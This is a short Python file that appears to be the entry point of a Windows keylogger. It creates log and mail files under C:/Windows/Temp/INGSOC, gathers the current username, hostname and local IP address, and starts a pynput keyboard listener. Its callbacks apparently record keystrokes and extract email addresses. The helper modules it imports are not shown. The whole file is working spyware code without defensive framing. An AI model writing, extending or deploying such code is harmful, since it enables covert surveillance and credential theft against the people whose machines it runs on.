import getpass
import os
import socket
import Data
import Keylog
from os import remove
from pynput import keyboard

# Make txt files
def txt_exits():
    try:
        os.mkdir('C:/Windows/Temp/INGSOC')
    except OSError:
        pass

    file1 = open('C:/Windows/Temp/INGSOC/log.txt', 'w')
    file1.close()
    file = open('C:/Windows/Temp/INGSOC/mail.txt', 'w')
    file.write('\n\t== Mails ==\n')
    file.close()

# Delete txt files
def txt_remover():
    try:
        remove('C:/Windows/Temp/INGSOC/log.txt')
        remove('C:/Windows/Temp/INGSOC/mail.txt')
    except FileNotFoundError:
        pass

if __name__ == '__main__':
    txt_remover()
    txt_exits()
    Data.data(getpass.getuser(), socket.gethostbyname(socket.gethostname()), socket.gethostname())
    with keyboard.Listener(Keylog.pulse, Keylog.mail_finder) as listener:
        listener.join()
